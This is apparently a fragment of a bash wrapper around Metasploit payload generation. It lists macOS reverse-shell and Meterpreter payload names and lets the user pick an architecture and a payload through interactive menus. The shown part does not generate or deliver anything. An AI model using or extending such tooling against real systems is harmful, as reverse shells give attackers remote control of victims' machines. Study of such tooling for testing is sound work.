MacOS_x64_Meter_RevTcp=osx/x64/meterpreter/reverse_tcp
MacOS_x86_Shell_RevTcp=osx/x86/shell_reverse_tcp
MacOS_x64_Shell_RevTcp=osx/x64/shell_reverse_tcp

ARCHVALID=false

until [ "$ARCHVALID" == true ]
do
    clear
    echo "[ MacOS Architecture ]"
    echo "[i] 1 - x86"
    echo "[i] 2 - x64" 
    echo ""
    Input "[i] Select MacOS Arch: " 
    MACOSARCH=$UserInput
    
    case $MACOSARCH in 
                1)
                    ARCHVALID=true
                    MACOSARCH=x86
                    PAYLOADVALID=false
                    until [ "$PAYLOADVALID" == true ]
                    do
                        clear
                        echo "[ Payloads ]"
                        echo "[i] 1 - Shell Reverse TCP"
                        echo ""
                        Input "[i] Select Payload: " 
                        PAYLOAD=$UserInput
                            case $PAYLOAD in
                                        1)
                                            PAYLOAD=$MacOS_x86_Shell_RevTcp
                                            PAYLOADVALID=true
                                        ;;
                                        *)
                                            PAYLOADVALID=false
                            esac
                    done
                ;;
                
                2)
                    ARCHVALID=true
                    MACOSARCH=x64
                    PAYLOADVALID=false
                    until [ "$PAYLOADVALID" == true ]
                    do
                        clear
                        echo "[ Payloads ]"
                        echo "[i] 1 - Meterpreter Reverse TCP"
                        echo "[i] 2 - Shell Reverse TCP"
                        echo ""
                        Input "[i] Select Payload: " 
                        PAYLOAD=$UserInput
                            case $PAYLOAD in
                                        1)
                                            PAYLOAD=$MacOS_x64_Meter_RevTcp
                                            PAYLOADVALID=true
                                        ;;
                                        2)
                                            PAYLOAD=$MacOS_x64_Shell_RevTcp
                                            PAYLOADVALID=true
                                        ;;
                                        *)
                                            PAYLOADVALID=false
                            esac
                    done
                ;;
                *)
                    ARCHVALID=false
    esac
done
ARCH=$MACOSARCH

